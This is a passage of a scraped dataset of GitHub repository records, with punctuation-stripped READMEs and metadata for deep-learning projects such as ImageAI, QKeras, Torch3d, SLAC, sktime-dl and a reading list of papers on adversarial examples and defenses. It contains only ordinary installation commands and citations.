via pip pip3 install keras ImageAI 2 0 3 pip3 install imageai Video Prediction Results Click below to watch the video demonstration of the trained model at work SparseTraffic 99 98759031295776 Accident 0 006892996316310018 DenseTraffic 0 0031178133212961257 Fire 0 0023975149815669283 DenseTraffic 100 0 Accident 9 411973422857045e 07 Fire 2 656607822615342e 07 SparseTraffic 4 631924704900925e 09 Accident 99 94832277297974 SparseTraffic 0 04670554480981082 Fire 0 004610423275153153 DenseTraffic 0 00035401615150476573 Fire 100 0 Accident 1 9869084979303675e 22 DenseTraffic 3 262699368229192e 23 SparseTraffic 6 003136426033551e 28 References 1 Kaiming H et al Deep Residual Learning for Image Recognition https arxiv org abs 1512 03385,2019-07-04T14:17:04Z,2019-12-14T13:23:05Z,Python,OlafenwaMoses,User,6,82,28,7,master,OlafenwaMoses,1,1,1,1,0,0,0
tirthajyoti,Deep-learning-with-Python,artificial-intelligence#cnn#computer-vision#convolutional-neural-networks#deep-learning#generative-adversarial-network#google-colab#image-classification#keras#machine-learning#neural-networks#object-detection#recurrent-neural-networks#resnet#rnn#vgg16,License MIT https img shields io badge License MIT yellow svg https opensource org licenses MIT GitHub forks https img shields io github forks tirthajyoti Deep Learning with Python svg https github com tirthajyoti Deep Learning with Python network GitHub stars https img shields io github stars tirthajyoti Deep Learning with Python svg https github com tirthajyoti Deep Learning with Python stargazers PRs Welcome https img shields io badge PRs welcome brightgreen svg https github com tirthajyoti Deep Learning with Python pulls Deep Learning with Python Website https dl with python readthedocs io en latest Collection of a variety of Deep Learning DL code examples tutorial style Jupyter notebooks and projects Many of the Jupyter notebooks are built on Google Colab https colab research google com and may employ special functions exclusive to Google Colab for example uploading data or pulling data directly from a remote repo using standard Linux commands Here is the Github Repo https github com tirthajyoti Deep learning with Python Authored and maintained by Dr Tirthajyoti Sarkar Website https tirthajyoti github io LinkedIn profile https www linkedin com in tirthajyoti sarkar 2127aa7 Requirements Python 3 6 NumPy pip install numpy Pandas pip install pandas MatplotLib pip install matplotlib Tensorflow pip install tensorflow or pip install tensorflow gpu Of course to use a local GPU correctly you need to do lot more work setting up proper GPU driver and CUDA installation If you are using Ubuntu 18 04 here is a guide https mc ai tensorflow gpu installation on ubuntu 18 04 If you are on Windows 10 here is a guide https towardsdatascience com installing tensorflow with cuda cudnn and gpu support on windows 10 60693e46e781 It is also highly recommended to install GPU version in a separate virtual environment so as to not mess up the default system install Keras pip install keras NOTE Most of the Jupyter notebooks in this repo are built on Google Colaboratory https colab research google com using Google GPU cluster https cloud google com gpu and a virtual machine Therefore you may not need to install these packages on your local machine if you also want to use Google colab You can directly launch the notebooks in your Google colab environment by clicking on the links provided in the notebooks of course that makes a copy of my notebook on to your Google drive For more information about using Google Colab for your deep learning work check their FAQ here https research google com colaboratory faq html Utility function I created a utility function file called DLutils py in the utils directory under Notebooks We use functions from this module whenever possible in the Jupyter notebooks You can download the module raw Python file from here DL Utility Module https raw githubusercontent com tirthajyoti Deep learning with Python master Notebooks utils DLutils py Notebooks Deep learning vs linear model We show a nonlinear function approximation task performed by linear model polynomial degree and a simple 1 2 hidden layer densely connected neural net to illustrate the difference and the capacity of deep neural nets to take advantage of larger datasets Here is the Notebook https github com tirthajyoti Deep learning with Python blob master Notebooks Function 20approximation 20by 20linear 20model 20and 20deep 20network ipynb Simple Conv Net Fashion MNIST https github com zalandoresearch fashion mnist image classification using densely connected network and 1 2 3 layer CNNs Here is the Notebook https github com tirthajyoti Computervision blob master Notebooks FashionMNISTusingCNN ipynb Using Keras ImageDataGenerator and other utilities Horse or human image classification using Keras ImageDataGenerator and Google colaboratory platform Here is the Notebook https github com tirthajyoti Computervision blob master Notebooks HorseorHumanwithImageGenerator ipynb Classification on the flowers dataset https www kaggle com alxmamaev flowers recognition and the famous Caltech 101 dataset http www vision caltech edu ImageDatasets Caltech101 using fitgenerator and flowfromdirectory method of the ImageDataGenerator Illustrates how to streamline CNN model building from a single storage of image data using these utility methods Here is the Notebook https github com tirthajyoti Deep learning with Python blob master Notebooks Kerasflowfromdirectory ipynb Transfer learning Simple illustration of transfer learning https machinelearningmastery com transfer learning for deep learning using CIFAR 10 dataset Here is the Notebook https github com tirthajyoti Deep learning with Python blob master Notebooks TransferlearningCIFAR ipynb Transfer learning with the famous Inception v3 model https www analyticsvidhya com blog 2018 10 understanding inception network from scratch building a classifier of pneumonia from chest X ray images Here is the Notebook https github com tirthajyoti Deep learning with Python blob master Notebooks Transfer learning InceptionV3 ipynb Activation maps We illustrate how to show the activation maps of various layers in a deep CNN model with just a couple of lines ofcode using Keract library Here is the Notebook https github com tirthajyoti Deep learning with Python blob master Notebooks Keract activation ipynb Adding object oriented programming style to deep learning workflow Adding simple Object oriented Programming OOP https realpython com python3 object oriented programming principle to your deep learning workflow Here is the Notebook https github com tirthajyoti Computervision blob master Notebooks OOPprincipledeeplearning ipynb Keras Callbacks using ResNet ResNet https medium com 14prakash understanding and implementing architectures of resnet and resnext for state of the art image cf51669e1624 on CIFAR 10 dataset https www cs toronto edu kriz cifar html showing how to use Keras Callbacks classes like ModelCheckpoint LearningRateScheduler and ReduceLROnPlateau You can also change a single parameter to generate ResNet of various depths Here is the Notebook https github com tirthajyoti Deep learning with Python blob master Notebooks ResNet on CIFAR10 ipynb Simple RNN Time series prediction using simple RNN a single RNN layer followed by a densely connected layer We show that a complicated time series signal is correctly predicted by a simple RNN even when trained with only 25 of the data Here is the Notebook https github com tirthajyoti Deep learning with Python blob master Notebooks SimpleRNN time series ipynb Text generation using LSTM Automatic text generation based on simple character vectors using LSTM network https colah github io posts 2015 08 Understanding LSTMs Play with character sequence length LSTM architecture and hyperparameters to generate synthetic texts based on a particular author s style Here is the Notebook https github com tirthajyoti Deep learning with Python blob master Notebooks LSTMtextgenDickens ipynb Bi directional LSTM for sentiment classification Bi directional LSTM with embedding https machinelearningmastery com develop bidirectional lstm sequence classification python keras applied to the IMDB sentiment classification task Here is the Notebook https github com tirthajyoti Deep learning with Python blob master Notebooks LSTMbidirectionalIMDBdata ipynb Generative adversarial network GAN Simple demo of building a GAN model from scratch using a one dimensional algebraic function Here is the Notebook https github com tirthajyoti Deep learning with Python blob master Notebooks GAN1D ipynb Scikit learn wrapper for Keras Keras Scikit learn wrapper https keras io scikit learn api example with 10 fold cross validation and exhaustive grid search Here is the Notebook https github com tirthajyoti Deep learning with Python blob master Notebooks KerasScikitLearnwrapper ipynb,2019-07-03T04:11:47Z,2019-12-11T21:04:15Z,Jupyter Notebook,tirthajyoti,User,8,77,60,113,master,tirthajyoti,1,0,0,0,0,0,1
google,qkeras,deep-learning#quantization#quantized-neural-networks,QKeras github com google qkeras https github com google qkeras Build Status https travis ci org google qkeras svg branch master https travis ci org google qkeras QKeras is a quantization extension to Keras that provides drop in replacement for some of the Keras layers especially the ones that creates parameters and activation layers and perform arithmetic operations so that we can quickly create a deep quantized version of Keras network According to Tensorflow documentation Keras is a high level API to build and train deep learning models It s used for fast prototyping advanced research and production with three key advantages User friendly Keras has a simple consistent interface optimized for common use cases It provides clear and actionable feedback for user errors Modular and composable Keras models are made by connecting configurable building blocks together with few restrictions Easy to extend Write custom building blocks to express new ideas for research Create new layers loss functions and develop state of the art models QKeras is being designed to extend the functionality of Keras using Keras design principle i e being user friendly modular and extensible adding to it being minimally intrusive of Keras native functionality In order to successfully quantize a model users need to replace variable creating layers Dense Conv2D etc by their counterparts QDense QConv2D etc and any layers that perform math operations need to be quantized afterwards Layers Implemented in QKeras QDense QConv1D QConv2D QDepthwiseConv2D QSeparableConv2D depthwise pointwise expanded extended from MobileNet SeparableConv2D implementation QActivation QAveragePooling2D in fact an AveragePooling2D stacked with a QActivation layer for quantization of the result QOctaveConv2D It is worth noting that not all functionality is safe at this time to be used with other high level operations such as with layer wrappers For example Bidirectional layer wrappers are used with RNNs If this is required we encourage users to use quantization functions invoked as strings instead of the actual functions as a way through this but we may change that implementation in the future QSeparableConv2D is implemented as a depthwise pointwise quantized expansions which is extended from the SeparableConv2D implementation of MobileNet Finally QBatchNormalization is still in its experimental stage as we have not seen the need to use this yet due to the normalization and regularization effects of stochastic activation functions A first attempt to create a safe mechanism in QKeras is the adoption of QActivation is a wrap up that provides an encapsulation around the activation functions so that we can save and restore the network architecture and duplicate them using Keras interface but this interface has not been fully tested yet Activation Layers Implemented in QKeras smoothsigmoid x hardsigmoid x binarysigmoid x binarytanh x smoothtanh x hardtanh x quantizedbits bits 8 integer 0 symmetric 0 keepnegative 1 x bernoulli alpha 1 0 x stochasticternary alpha 1 0 threshold 0 33 x ternary alpha 1 0 threshold 0 33 x stochasticbinary alpha 1 0 x binary alpha 1 0 x quantizedrelu bits 8 integer 0 usesigmoid 0 x quantizedulaw bits 8 integer 0 symmetric 0 u 255 0 x quantizedtanh bits 8 integer 0 symmetric 0 x quantizedpo2 bits 8 maxvalue 1 x quantizedrelupo2 bits 8 maxvalue 1 x The stochastic functions bernoulli as well as quantizedrelu and quantizedtanh rely on stochastic versions of the activation functions They draw a random number with uniform distribution from hardsigmoid of the input x and result is based on the expected value of the activation function Please refer to the papers if you want to understand the underlying theory or the documentation in qkeras qlayers py The parameters bits specify the number of bits for the quantization and integer specifies how many bits of bits are to the left of the decimal point Finally our experience in training networks with QSeparableConv2D both quantizedbits and quantizedtanh that generates values between 1 1 required symmetric versions of the range in order to properly converge and eliminate the bias Every time we use a quantization for weights and bias that can generate numbers outside the range 1 0 1 0 we need to adjust the range to the number For example if we have a quantizedbits bits 6 integer 2 in a weight of a layer we need to set the weight range to 2 2 Similarly for quantization functions that accept an alpha parameter we need to specify a range of alpha and for po2 type of quantizers we need to specify the range of maxvalue Example Suppose you have the following network An example of a very simple network is given below in Keras python from keras layers import x xin Input shape x Conv2D 18 3 3 name firstconv2d x x Activation relu x x SeparableConv2D 32 3 3 x x Activation relu x x Flatten x x Dense NBCLASSES x x Activation softmax x You can easily quantize this network as follows python from keras layers import from qkeras import x xin Input shape x QConv2D 18 3 3 kernelquantizer stochasticternary biasquantizer ternary name firstconv2d x x QActivation quantizedrelu 3 x x QSeparableConv2D 32 3 3 depthwisequantizer quantizedbits 4 0 1 pointwisequantizer quantizedbits 3 0 1 biasquantizer quantizedbits 3 depthwiseactivation quantizedtanh 6 2 1 x x QActivation quantizedrelu 3 x x Flatten x x QDense NBCLASSES kernelquantizer quantizedbits 3 biasquantizer quantizedbits 3 x x QActivation quantizedbits 20 5 x x Activation softmax x The last QActivation is advisable if you want to compare results later on Please find more cases under the directory examples Related Work QKeras has been implemented based on the work of B Moons et al Minimum Energy Quantized Neural Networks Asilomar Conference on Signals Systems and Computers 2017 and Zhou S et al DoReFa Net Training Low Bitwidth Convolutional Neural Networks with Low Bitwidth Gradients but the framework should be easily extensible The original code from QNN can be found below https github com BertMoons QuantizedNeuralNetworks Keras Tensorflow QKeras extends QNN by providing a richer set of layers including SeparableConv2D DepthwiseConv2D ternary and stochastic ternary quantizations besides some functions to aid the estimation for the accumulators and conversion between non quantized to quantized networks Finally our main goal is easy of use so we attempt to make QKeras layers a true drop in replacement for Keras so that users can easily exchange non quantized layers by quantized ones Acknowledgements Portions of QKeras were derived from QNN https github com BertMoons QuantizedNeuralNetworks Keras Tensorflow Copyright c 2017 Bert Moons where it applies,2019-08-06T22:11:58Z,2019-12-11T07:04:00Z,Python,google,Organization,14,75,8,17,master,zhuangh#qkeras-robot#qkeras-team,3,0,0,2,2,0,0
CHENGY12,DMML,baseline#meta-learning#metric-learning#person-reidentification#pytorch#resnet-50#vehicle-reidentification,Deep Meta Metric Learning DMML This repo contains PyTorch code for ICCV19 paper Deep Meta Metric Learning including person re identification experiments on Market 1501 and DukeMTMC reID datasets Requirements Python 3 6 PyTorch 0 4 tensorboardX 1 6 To install all python packages please run the following command pip install r requirements txt Datasets Downloading Market 1501 dataset can be downloaded from here http www liangzheng org Project projectreid html DukeMTMC reID dataset can be downloaded from here http vision cs duke edu DukeMTMC Preparation After downloading the datasets above move them to the datasets folder in the project root directory and rename dataset folders to market1501 and duke respectively I e the datasets folder should be organized as market1501 boundingboxtrain boundingboxtest duke boundingboxtrain boundingboxtest Usage Training After adding dataset directory in demo sh simply run the following command to train DMML on Market 1501 bash demo sh Usage instructions of all training parameters can be found in config py Evaluation To evaluate the performance of a trained model run python eval py which will output Rank 1 Rank 5 Rank 10 and mAP scores Citation Please use the citation provided below if it is useful to your research Guangyi Chen Tianren Zhang Jiwen Lu and Jie Zhou Deep Meta Metric Learning ICCV 2019 bash inproceedingschen2019deep title Deep Meta Metric Learning author Chen Guangyi and Zhang Tianren and Lu Jiwen and Zhou Jie booktitle ICCV year 2019,2019-07-24T14:32:27Z,2019-12-12T11:45:31Z,Python,CHENGY12,User,1,70,8,40,master,CHENGY12#FnTsyR,2,0,0,1,0,0,0
pqhieu,torch3d,3d-deep-learning#computer-vision#machine-learning#pytorch,Torch3d Build Status https img shields io travis pqhieu torch3d style flat square https travis ci com pqhieu torch3d codecov https img shields io codecov c github pqhieu torch3d style flat square https codecov io gh pqhieu torch3d PyPI https img shields io pypi v torch3d style flat square https pypi org project torch3d License https img shields io github license pqhieu torch3d style flat square LICENSE Torch3d is a PyTorch library consisting of datasets model architectures and common operations for 3D deep learning For 3D domain there is currently no official support from PyTorch that likes torchvision https github com pytorch vision for images Torch3d aims to fill this gap by streamlining the prototyping process of deep learning on 3D domain Currently Torch3d focuses on deep learning methods on 3D point sets Installation Required PyTorch 1 2 or newer Some other dependencies are torchvision h5py From PyPi bash pip install torch3d From source bash git clone https github com pqhieu torch3d cd torch3d pip install editable NOTE Some operators require CUDA Getting started Here are some examples to get you started These examples assume that you have a basic understanding of PyTorch Point cloud classification ModelNet40 using PointNet examples modelnet40 Beginner Take a look at SotA3d https github com pqhieu sota3d to see how Torch3d is being used in practice Modules Torch3d composes of the following modules datasets Common 3D datasets for classification semantic segmentation and so on ModelNet40 URL https modelnet cs princeton edu S3DIS URL http buildingparser stanford edu dataset html ShapeNetPart URL https cs stanford edu ericyi projectpage partannotation SceneNN URL http scenenn net metrics Metrics for on the fly training evaluation of different tasks Accuracy Jaccard Intersection over Union models State of the art models based on their original papers The following models are currently supported PointNet from Qi et al CVPR 2017 Paper https arxiv org abs 1612 00593 PoinNet from Qi et al NeurIPS 2017 Paper https arxiv org abs 1706 02413 DGCNN from Wang et al ToG 2019 Paper https arxiv org abs 1801 07829 nn Low level operators that can be used to build up complex 3D neural networks transforms Common transformations for dataset preprocessing,2019-07-08T00:45:57Z,2019-12-13T06:56:19Z,Python,pqhieu,User,6,69,1,179,master,pqhieu,1,3,3,0,4,0,0
alexlee-gk,slac,n/a,Stochastic Latent Actor Critic Project Page https alexlee gk github io slac Paper https arxiv org abs 1907 00953 Stochastic Latent Actor Critic Deep Reinforcement Learning with a Latent Variable Model Alex X Lee https alexlee gk github io Anusha Nagabandi https people eecs berkeley edu nagaban2 Pieter Abbeel https people eecs berkeley edu pabbeel Sergey Levine https people eecs berkeley edu svlevine arXiv preprint arXiv 1907 00953 2019 Getting started Prerequisites Linux or macOS Python 3 5 CPU or NVIDIA GPU CUDA CuDNN Installation Clone this repo bash git clone b master single branch https github com alexlee gk slac git cd slac To use the DeepMind Control Suite follow the instructions in the dmcontrol https github com deepmind dmcontrol package To use OpenAI Gym follow the instructions in the gym https github com openai gym and mujocopy https github com openai mujoco py packages Modify the requirements txt file if necessary Replace tf nightly gpu with tf nightly if using CPU Omit gym mujoco py or dmcontrol accordingly if only using one of the suites Install python packages bash pip install r requirements txt Install the tfagents package bash pip install git git github com tensorflow agents git Install ffmpeg optional used to generate GIFs for visualization in TensorBoard For some python installations the root directory should be added to the PYTHONPATH bash export PYTHONPATH path to slac PYTHONPATH Examples usage bash CUDAVISIBLEDEVICES 0 python slac agents slac examples v1 traineval py rootdir logs experimentname slac ginfile slac agents slac configs slac gin ginfile slac agents slac configs dmcontrolcheetahrun gin To view training and evaluation information e g learning curves GIFs of rollouts and predictions run tensorboard logdir logs and open http localhost 6006 The gin configurable parameters can be modified using the ginparam flag e g bash CUDAVISIBLEDEVICES 0 python slac agents slac examples v1 traineval py rootdir logs experimentname slac ginfile slac agents slac configs slac gin ginfile slac agents slac configs dmcontrolcheetahrun gin ginparam traineval gpuallowgrowth True ginparam traineval sequencelength 8 ginparam traineval actionrepeat 2 Troubleshooting No matching distribution found for tf nightly gpu 1 15 0 dev20190821 or similar when installing packages in requirements txt Upgrade pip pip install upgrade pip pkgresources VersionConflict setuptools 40 8 0 lib python3 7 site packages Requirement parse setuptools 41 0 0 when running tensorboard Upgrade setuptools pip install upgrade setuptools Other errors Make sure to exactly use the versions of the python packages in the requirements txt file and in the installation instructions e g pip install upgrade r requirements txt pip install upgrade git git github com tensorflow agents git Citation If you find this useful for your research please use the following articlelee2019slac title Stochastic Latent Actor Critic Deep Reinforcement Learning with a Latent Variable Model author Alex X Lee and Anusha Nagabandi and Pieter Abbeel and Sergey Levine journal arXiv preprint arXiv 1907 00953 year 2019,2019-06-29T01:53:51Z,2019-12-10T17:01:16Z,Python,alexlee-gk,User,14,61,9,12,master,alexlee-gk,1,0,0,3,0,1,0
nebula-beta,awesome-adversarial-deep-learning,adversarial-attacks#adversarial-defense#computer-vision#deep-learning,TOC Awesome Adversarial Examples for Deep Learning Table of Contents Survey Survey Attack Attack Defense Defense Competition Competition ToolBox ToolBox Survey Threat of Adversarial Attacks on Deep Learning in Computer Vision A Survey https arxiv org abs 1801 00553 Attack Gradient base method Box constrained L BFGS Intriguing properties of neural networks https arxiv org pdf 1312 6199 pdf Szegedy Christian et al ICLR Poster 2014 blogs https www cnblogs com lainey p 8552422 html FGSM Explaining and harnessing adversarial examples https arxiv org abs 1412 6572 Goodfellow Ian J Jonathon Shlens and Christian Szegedy ICLR Poster 2015 code https github com 1Konny FGSM I FGSM Adversarial examples in the physical world https arxiv org abs 1607 02533 Kurakin Alexey Ian Goodfellow and Samy Bengio ICLR Workshop 2017 code https github com 1Konny FGSM MI FGSM Boosting Adversarial Attacks with Momentum http openaccess thecvf com contentcvpr2018 html DongBoostingAdversarialAttacksCVPR2018paper html Dong Y Liao F Pang T et al CVPR 2017 poster http ml cs tsinghua edu cn yinpeng poster Attack CVPR2018 pdf code DI 2 FGSM and M DI 2FGSM Improving Transferability of Adversarial Examples with Input Diversity https arxiv org abs 1803 06978 Xie Cihang et al CVPR 2019 code https github com cihangxie DI 2 FGSM Relationships between above different attacks JSMA The limitations of deep learning in adversarial settings https ieeexplore ieee org document 7467366 Papernot Nicolas et al EuroS P IEEE 2016 One Pixel Attack One pixel attack for fooling deep neural networks https ieeexplore ieee org abstract document 8601309 J Su D V Vargas S Kouichi arXiv preprint arXiv 1710 08864 2017 DeepFool DeepFool a simple and accurate method to fool deep neural networks https arxiv org abs 1511 04599 S Moosavi Dezfooli et al CVPR 2016 C W Towards Evaluating the Robustness of Neural Networks https ieeexplore ieee org abstract document 7958570 N Carlini D Wagner arXiv preprint arXiv 1608 04644 2016 ATNs Adversarial Transformation Networks Learning to Generate Adversarial Examples https arxiv org abs 1703 09387 S Baluja I Fischer arXiv preprint arXiv 1703 09387 2017 UPSET and ANGRI UPSET and ANGRI Breaking High Performance Image Classifiers https arxiv org abs 1707 01159 Sarkar A Bansal U Mahbub and R Chellappa arXiv preprint arXiv 1707 01159 2017 Intriguing properties of neural networks https arxiv org pdf 1312 6199 pdf Szegedy Christian et al arXiv preprint arXiv 1312 6199 2013 Explaining and harnessing adversarial examples https arxiv org abs 1412 6572 Goodfellow Ian J Jonathon Shlens and Christian Szegedy arXiv preprint arXiv 1412 6572 2014 Deep neural networks are easily fooled High confidence predictions for unrecognizable images https www cv foundation org openaccess contentcvpr2015 html NguyenDeepNeuralNetworks2015CVPRpaper html Nguyen Anh Jason Yosinski and Jeff Clune Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2015 Adversarial examples in the physical world https arxiv org abs 1607 02533 Kurakin Alexey Ian Goodfellow and Samy Bengio arXiv preprint arXiv 1607 02533 2016 Adversarial diversity and hard positive generation https www cv foundation org openaccess contentcvpr2016workshops w12 html RozsaAdversarialDiversityandCVPR2016paper html Rozsa Andras Ethan M Rudd and Terrance E Boult Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition Workshops 2016 The limitations of deep learning in adversarial settings http ieeexplore ieee org abstract document 7467366 Papernot Nicolas et al Security and Privacy EuroS P 2016 IEEE European Symposium on IEEE 2016 Adversarial manipulation of deep representations https arxiv org abs 1511 05122 Sabour Sara et al ICLR 2016 Deepfool a simple and accurate method to fool deep neural networks https www cv foundation org openaccess contentcvpr2016 html Moosavi DezfooliDeepFoolASimpleCVPR2016paper html Moosavi Dezfooli Seyed Mohsen Alhussein Fawzi and Pascal Frossard Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition 2016 Universal adversarial perturbations https arxiv org abs 1610 08401 Moosavi Dezfooli Seyed Mohsen et al IEEE Conference on Computer Vision and Pattern Recognition CVPR 2017 Towards evaluating the robustness of neural networks https arxiv org abs 1608 04644 Carlini Nicholas and David Wagner Security and Privacy S P 2017 Machine Learning as an Adversarial Service Learning Black Box Adversarial Examples https arxiv org abs 1708 05207 Hayes Jamie and George Danezis arXiv preprint arXiv 1708 05207 2017 Zoo Zeroth order optimization based black box attacks to deep neural networks without training substitute models https arxiv org abs 1708 03999 Chen Pin Yu et al 10th ACM Workshop on Artificial Intelligence and Security AISEC with the 24th ACM Conference on Computer and Communications Security CCS 2017 Ground Truth Adversarial Examples https arxiv org abs 1709 10207 Carlini Nicholas et al arXiv preprint arXiv 1709 10207 2017 Generating Natural Adversarial Examples https arxiv org abs 1710 11342 Zhao Zhengli Dheeru Dua and Sameer Singh arXiv preprint arXiv 1710 11342 2017 Obfuscated Gradients Give a False Sense of Security Circumventing Defenses to Adversarial Examples https arxiv org abs 1802 00420 Anish Athalye Nicholas Carlini David Wagner arXiv preprint arXiv 1802 00420 2018 Defense Network Ditillation Distillation as a defense to adversarial perturbations against deep neural networks http ieeexplore ieee org abstract document 7546524 Papernot Nicolas et al Security and Privacy SP 2016 IEEE Symposium on IEEE 2016 Adversarial Re Training Learning with a strong adversary https arxiv org abs 1511 03034 Huang Ruitong et al arXiv preprint arXiv 1511 03034 2015 Adversarial machine learning at scale https arxiv org abs 1611 01236 Kurakin Alexey Ian Goodfellow and Samy Bengio ICLR 2017 Ensemble Adversarial Training Attacks and Defenses https arxiv org abs 1705 07204 Tramr Florian et al arXiv preprint arXiv 1705 07204 2017 Adversarial training for relation extraction http www aclweb org anthology D17 1187 Wu Yi David Bamman and Stuart Russell Proceedings of the 2017 Conference on Empirical Methods in Natural Language Processing 2017 Adversarial Logit Pairing https arxiv org abs 1803 06373 Harini Kannan Alexey Kurakin Ian Goodfellow arXiv preprint arXiv 1803 06373 2018 Adversarial Detecting Detecting Adversarial Samples from Artifacts https arxiv org abs 1703 00410 Feinman Reuben et al arXiv preprint arXiv 1703 00410 2017 Adversarial and Clean Data Are Not Twins https arxiv org abs 1704 04960 Gong Zhitao Wenlu Wang and Wei Shinn Ku arXiv preprint arXiv 1704 04960 2017 Safetynet Detecting and rejecting adversarial examples robustly https arxiv org abs 1704 00103 Lu Jiajun Theerasit Issaranon and David Forsyth ICCV 2017 On the statistical detection of adversarial examples https arxiv org abs 1702 06280 Grosse Kathrin et al arXiv preprint arXiv 1702 06280 2017 On detecting adversarial perturbations https arxiv org abs 1702 04267 Metzen Jan Hendrik et al ICLR Poster 2017 Early Methods for Detecting Adversarial Images https openreview net forum id B1dexpDug noteId B1dexpDug Hendrycks Dan and Kevin Gimpel ICLR Workshop 2017 Dimensionality Reduction as a Defense against Evasion Attacks on Machine Learning Classifiers https arxiv org abs 1704 02654 Bhagoji Arjun Nitin Daniel Cullina and Prateek Mittal arXiv preprint arXiv 1704 02654 2017 Detecting Adversarial Attacks on Neural Network Policies with Visual Foresight https arxiv org abs 1710 00814 Lin Yen Chen et al arXiv preprint arXiv 1710 00814 2017 PixelDefend Leveraging Generative Models to Understand and Defend against Adversarial Examples https arxiv org abs 1710 10766 Song Yang et al arXiv preprint arXiv 1710 10766 2017 Input Reconstruction PixelDefend Leveraging Generative Models to Understand and Defend against Adversarial Examples https arxiv org abs 1710 10766 Song Yang et al arXiv preprint arXiv 1710 10766 2017 MagNet a Two Pronged Defense against Adversarial Examples https arxiv org abs 1705 09064 Meng Dongyu and Hao Chen CCS 2017 Towards deep neural network architectures robust to adversarial examples https arxiv org abs 1412 5068 Gu Shixiang and Luca Rigazio arXiv preprint arXiv 1412 5068 2014 Classifier Robustifying Adversarial Examples Uncertainty and Transfer Testing Robustness in Gaussian Process Hybrid Deep Networks https arxiv org abs 1707 02476 Bradshaw John Alexander G de G Matthews and Zoubin Ghahramani arXiv preprint arXiv 1707 02476 2017 Robustness to Adversarial Examples through an Ensemble of Specialists https arxiv org abs 1702 06856 Abbasi Mahdieh and Christian Gagn arXiv preprint arXiv 1702 06856 2017 Network Verification Reluplex An efficient SMT solver for verifying deep neural networks https arxiv org abs 1702 01135 Katz Guy et al CAV 2017 Safety verification of deep neural networks https link springer com chapter 10 1007 978 3 319 63387 91 Huang Xiaowei et al International Conference on Computer Aided Verification Springer Cham 2017 Towards proving the adversarial robustness of deep neural networks https arxiv org abs 1709 02802 Katz Guy et al arXiv preprint arXiv 1709 02802 2017 Deepsafe A data driven approach for checking adversarial robustness in neural networks https arxiv org abs 1710 00486 Gopinath Divya et al arXiv preprint arXiv 1710 00486 2017 DeepXplore Automated Whitebox Testing of Deep Learning Systems https arxiv org abs 1705 06640 Pei Kexin et al arXiv preprint arXiv 1705 06640 2017 Others Adversarial Example Defenses Ensembles of Weak Defenses are not Strong https arxiv org abs 1706 04701 He Warren et al 11th USENIX Workshop on Offensive Technologies WOOT 17 2017 Adversarial Examples Are Not Easily Detected Bypassing Ten Detection Methods https arxiv org abs 1705 07263 Carlini Nicholas and David Wagner AISec 2017 Competition NIPS 2017 Defense Against Adversarial Attack https www kaggle com c nips 2017 defense against adversarial attack data NIPS 2018 Adversarial Vision Challenge https www crowdai org challenges GeekPwn CAAD 2018 http 2018 geekpwn org en index html 4 Winners http hof geekpwn org caad en index2 html IJCAI 19 Alibaba Adversarial AI Challenge https tianchi aliyun com markets tianchi ijcai19en GeekPwn CAAD 2019 http www geekpwn org zh index html ToolBox advertorch https github com BorealisAI advertorch foolbox https github com bethgelab foolbox cleverhans https github com tensorflow cleverhans Adversarial Face Attack https github com ppwwyyxx Adversarial Face Attack adversarial robustness toolbox https github com IBM adversarial robustness toolbox,2019-08-02T14:26:38Z,2019-12-12T07:25:07Z,n/a,nebula-beta,User,2,53,2,0,master,,0,0,0,0,0,0,0
sktime,sktime-dl,n/a,image https travis ci com uea machine learning sktime dl svg branch master target https travis ci com uea machine learning sktime dl image https badge fury io py sktime dl svg target https badge fury io py sktime dl image https badges gitter im sktime community svg target https gitter im sktime community utmsource badge utmmedium badge utmcampaign pr badge sktime dl An extension package for deep learning with Keras for sktime a scikit learn compatible Python toolbox for learning with time series and panel data The package is under active development Currently classification models based off the the networks in dl 4 tsc have been implemented as well as an example of a tuned network for future development Installation This package uses the base sktime as a dependency Follow the original instructions to install this The sktime dl package currently has API calls up to date with sktime version 0 3 0 Updates to sktime may precede sktime dl updates by some lag time For the deep learning part of sktime dl you need Keras keras contrib and a compatible backend for Keras one of tensorflow confirmed working v1 8 0 theano untested CNTK untested If you want to run the networks on a GPU CUDNN is also required to be able to utilise your GPU For windows users we recommend following this unaffiliated guide For linux users all of these points should hopefully be relatively straight forward via simple pip commands and conversions from the previous link For mac users I am unfortunately unsure of the best processes for installing these If you have links to a tested and up to date guide let us know James Large Overview A repository for off the shelf networks The aim is to define Keras networks able to be directly used within sktime and its pipelining and strategy tools and by extension scikit learn for use in applications and research Overtime we wish to interface or reimplement networks from the literature in the context of time series analysis Currently we interface with a number of networks for time series classification in particular dl 4 tsc interfacing This toolset currently serves as an interface to dl 4 tsc and implements the following network archtiectures Time convolutional neural network CNN Encoder Encoder Fully convolutional neural network FCNN Multi channel deep convolutional neural network MCDCNN Multi scale convolutional neural network MCNN Multi layer perceptron MLP Residual network resnet Time Le Net tlenet Time warping invariant echo state network twiesn Documentation The full API documentation to the base sktime and an introduction can be found here Tutorial notebooks for currently stable functionality are in the examples folder Documentation for sktime dl shall be produced in due course Contributors Former and current active contributors are as follows sktime dl James Large James Large Aaron Bostrom ABostrom Hassan Ismail Fawaz hfawaz Markus Lning mloning sktime Project management Jason Lines jasonlines Franz Kirly fkiraly Design Anthony Bagnall TonyBagnall Sajaysurya Ganesh sajaysurya Jason Lines jasonlines Viktor Kazakov viktorkaz Franz Kirly fkiraly Markus Lning mloning Coding Sajaysurya Ganesh sajaysurya Bagnall TonyBagnall Jason Lines jasonlines George Oastler goastler Viktor Kazakov viktorkaz Markus Lning mloning We are actively looking for contributors Please contact fkiraly or jasonlines for volunteering or information on paid opportunities or simply raise an issue in the tracker,2019-07-24T12:08:53Z,2019-12-06T18:51:30Z,Python,sktime,Organization,5,53,6,58,master,James-Large#mloning,2,1,1,3,3,1,8
rasbt,DeepLearning-Gdansk2019-tutorial,age-prediction#biometrics#deep-learning#face-recognition#ordinal-regression,Ordinal Regression tutorial for the International Summer School on Deep Learning 2019 img png Slides ISSonDL2019tutorial slides pdf ISSonDL2019tutorial slides pdf,2019-06-29T02:19:55Z,2019-12-08T23:34:53Z,Jupyter Notebook,rasbt,User,5,52,11,6,master,rasbt,1,0,0,0,0,0,0
